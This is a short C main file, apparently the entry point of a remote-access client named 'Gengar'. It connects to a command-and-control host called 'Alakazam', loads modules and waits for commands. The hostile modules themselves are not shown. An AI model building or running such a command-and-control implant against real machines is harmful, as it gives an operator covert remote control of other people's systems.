#include <stdlib.h>
#include "include/commander.h"
#include "include/cnc.h"
#include "include/modules.h"
#include "include/logger.h"

int main(int argc, char *argv[])
{
    char *alakazam_host = NULL;

#ifdef ALAKAZAM_HOST
    alakazam_host = ALAKAZAM_HOST;
#else
    if (argc != 2)
    {
        fprintf(stderr, "usage: %s ALAKAZAM_HOST", argv[0]);
        exit(EXIT_FAILURE);
    }
    alakazam_host = argv[1];
#endif

    log_info("Gengar started.");
    cnc_init_conn(alakazam_host);
    modules_init();
    listen_for_cmds();
}
